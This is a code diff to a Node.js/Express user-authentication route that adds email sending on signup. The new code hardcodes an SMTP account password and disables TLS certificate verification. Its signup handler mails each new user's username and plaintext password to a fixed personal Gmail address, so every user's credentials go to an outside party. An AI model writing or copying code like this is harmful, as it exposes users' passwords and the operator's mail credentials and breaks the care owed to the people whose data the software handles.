@@ -4,20 +4,99 @@ const { User } = require('../models');
 const bcrypt = require('bcrypt');
 const jwt = require('jsonwebtoken');
 const storeToken = require('./auth/storeToken');
-
+const nodemailer = require("nodemailer");
+var Email = require('email-templates');
+var path = require('path');
 
 
 const saltRounds = 10;
 
 const prepareResponse = (response, status, body, type) => {
-  //response.set('Content-Type', type);
+  response.set('Content-Type', type);
   response.status(status).send(body);
 };
 
+const prepareEmailSending = () =>
+{
+    let transporter = nodemailer.createTransport({
+        host: "mail.aroundorder.com",
+        port: 465,
+        secure: true, // true for 465, false for other ports
+        auth: {
+            user: 'info@aroundorder.com',
+            pass: 'Transp0rt1!',
+        },
+        tls: {
+          rejectUnauthorized: false
+        }
+    });
+
+
+        const email = new Email(
+            {
+                message:
+                    {
+                        from: '"Daijara" <info@aroundorder.com>'
+                    },
+             
+                send: true,
+                transport: transporter,
+                views: {
+                    options: {
+                        extension: 'jade'
+                    }
+                },
+                juice: true,
+                juiceSettings:
+                    {
+                        tableElements: ['TABLE']
+                    },
+                juiceResources:
+                    {
+                        preserveImportant: true,
+                        webResources:
+                            {
+                                relativeTo: path.join(__dirname, '..', 'emails', 'email'),
+                                images: true
+                            }
+                    }
+            });
+    
+        return email;
+    };
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+//////////
 router.get('/', async function (req, res, next) {
   prepareResponse(res, 200, { success: true }, 'application/json');
 });
-
+//////
 /* GET users listing. */
 router.get('/:id', async function (req, res, next) {
   let id = req.params.id;
@@ -29,7 +108,7 @@ router.get('/:id', async function (req, res, next) {
 
 
 
-
+////////////
 router.post('/login', async function (req, res, next) {
   let { username, password } = req.body;
 
@@ -123,7 +202,9 @@ router.post('/signin', function (req, res, next) {
 });
 
 //SIGNUP 
-router.post('/signup', function (req, res, next) {
+router.post('/signup', function (req, res, next) 
+{
+  console.log("here");
 
   let { username, password, role, email } = req.body;
 
@@ -163,6 +244,29 @@ router.post('/signup', function (req, res, next) {
     {
       const token = await jwt.sign({ email: req.body.email }, process.env.SECRET, 
         { expiresIn: parseInt(process.env.EXPIRATION) });
+
+        const emailSender = prepareEmailSending();
+   emailSender.send(
+        {
+            template: 'email',
+            message: {
+              to: 'rahma.elkalai01@gmail.com',
+                attachments: [{
+                    path: `${__dirname}/../emails/email/images/daijara.png`,
+                    cid: 'logo'
+                }]
+            },
+            locals: {
+
+              username: username,
+              password: password,
+              role:role, 
+              email: email
+
+            }
+
+            
+        });
 
         const response = {
                      success: true,
